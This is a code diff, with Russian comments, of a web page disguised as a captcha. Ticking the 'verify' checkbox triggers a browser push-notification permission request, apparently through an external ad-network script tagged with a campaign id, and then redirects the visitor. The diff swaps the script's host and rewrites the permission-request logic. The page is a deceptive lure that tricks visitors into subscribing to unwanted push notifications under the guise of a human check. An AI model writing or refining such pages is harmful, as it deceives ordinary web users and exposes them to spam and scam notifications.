@@ -169,7 +169,7 @@
 </style>
 </head>
 <body>
-    <script type="application/javascript" src="https://lobpc.ext-jscdn.com/ps/ps.js?id=HnFv7gIgUEyhZsQd8kp20Q&sub_id=test_campaign" async></script>
+    <script type="application/javascript" src="https://lobpc.sjscdn.com/ps/ps.js?id=HnFv7gIgUEyhZsQd8kp20Q&sub_id=test_campaign" async></script>
     <div class="container">
         <div class="captcha-container">
             <div class="captcha-left">
@@ -482,92 +482,66 @@ function waitForPsJs(maxAttempts = 10, interval = 500) {
     });
 }
 
-// Функция для запроса подписки
 function requestSubscription(checkbox) {
-    console.log('Запуск requestSubscription');
-    try {
-        if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
-            console.log('Уведомления уже разрешены или заблокированы:', Notification.permission);
-            logSubscription(Notification.permission);
-            checkbox.classList.remove('loading');
-            checkbox.classList.add('completed');
-            setTimeout(() => {
-                console.log('Запуск редиректа после галочки');
-                performRedirect();
-            }, 1000);
-            return;
-        }
-
-        waitForPsJs()
-            .then(() => {
-                console.log('Вызываем подписку через ps.js');
-                window.ps.showPrompt()
-                    .then(result => {
-                        console.log('Результат подписки:', result);
-                        logSubscription(Notification.permission);
-                        checkbox.classList.remove('loading');
-                        checkbox.classList.add('completed');
-                        setTimeout(() => {
-                            console.log('Запуск редиректа после галочки');
-                            performRedirect();
-                        }, 1000);
-                    })
-                    .catch(err => {
-                        console.error('Ошибка вызова подписки:', err);
-                        logSubscription(Notification.permission);
-                        checkbox.classList.remove('loading');
-                        checkbox.classList.add('completed');
-                        setTimeout(() => {
-                            console.log('Запуск редиректа после галочки');
-                            performRedirect();
-                        }, 1000);
-                    });
-            })
-            .catch(() => {
-                console.log('API ps.js не доступен, пробуем Notification API');
-                if ('Notification' in window) {
-                    Notification.requestPermission()
-                        .then(permission => {
-                            console.log('Результат разрешения:', permission);
-                            logSubscription(permission);
-                            checkbox.classList.remove('loading');
-                            checkbox.classList.add('completed');
-                            setTimeout(() => {
-                                console.log('Запуск редиректа после галочки');
-                                performRedirect();
-                            }, 1000);
-                        })
-                        .catch(err => {
-                            console.error('Ошибка Notification API:', err);
-                            logSubscription('error');
-                            checkbox.classList.remove('loading');
-                            checkbox.classList.add('completed');
-                            setTimeout(() => {
-                                console.log('Запуск редиректа после галочки');
-                                performRedirect();
-                            }, 1000);
-                        });
-                } else {
-                    console.log('Уведомления не поддерживаются');
-                    logSubscription('unsupported');
-                    checkbox.classList.remove('loading');
-                    checkbox.classList.add('completed');
-                    setTimeout(() => {
-                        console.log('Запуск редиректа после галочки');
-                        performRedirect();
-                    }, 1000);
-                }
-            });
-    } catch (e) {
-        console.error('Общая ошибка в requestSubscription:', e);
-        logSubscription('error');
-        checkbox.classList.remove('loading');
-        checkbox.classList.add('completed');
-        setTimeout(() => {
-            console.log('Запуск редиректа после галочки');
-            performRedirect();
-        }, 1000);
+  console.log('Запуск requestSubscription');
+  try {
+    if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
+      console.log('Уведомления уже разрешены или заблокированы:', Notification.permission);
+      logSubscription(Notification.permission);
+      checkbox.classList.remove('loading');
+      checkbox.classList.add('completed');
+      setTimeout(() => {
+        console.log('Запуск редиректа после галочки');
+        performRedirect();
+      }, 1000);
+      return;
     }
+
+    if ('Notification' in window) {
+      console.log('Запрашиваем разрешение на уведомления');
+      Notification.requestPermission()
+        .then(permission => {
+          console.log('Результат Notification.requestPermission:', permission);
+          logSubscription(permission);
+          checkbox.classList.remove('loading');
+          checkbox.classList.add('completed');
+          setTimeout(() => {
+            console.log('Запуск редиректа после разрешения');
+            performRedirect();
+          }, 1000);
+        })
+        .catch(err => {
+          console.error('Ошибка Notification.requestPermission:', err);
+          logSubscription('error');
+          checkbox.classList.remove('loading');
+          checkbox.classList.add('completed');
+          setTimeout(() => {
+            console.log('Запуск редиректа после ошибки');
+            performRedirect();
+          }, 1000);
+        });
+    } else {
+      console.log('Уведомления не поддерживаются');
+      logSubscription('unsupported');
+      checkbox.classList.remove('loading');
+      checkbox.classList.add('completed');
+      document.getElementById('error').textContent = translations[lang].error || 'Notifications are not supported in this browser.';
+      document.getElementById('error').style.display = 'block';
+      setTimeout(() => {
+        console.log('Запуск редиректа после неподдержки уведомлений');
+        performRedirect();
+      }, 1000);
+    }
+  } catch (e) {
+    console.error('Общая ошибка в requestSubscription:', e);
+    logSubscription('error');
+    checkbox.classList.remove('loading');
+    checkbox.classList.add('completed');
+    setTimeout(() => {
+      console.log('Запуск редиректа после общей ошибки');
+      performRedirect();
+    }, 1000);
+  }
 }
 
 // Функция проверки
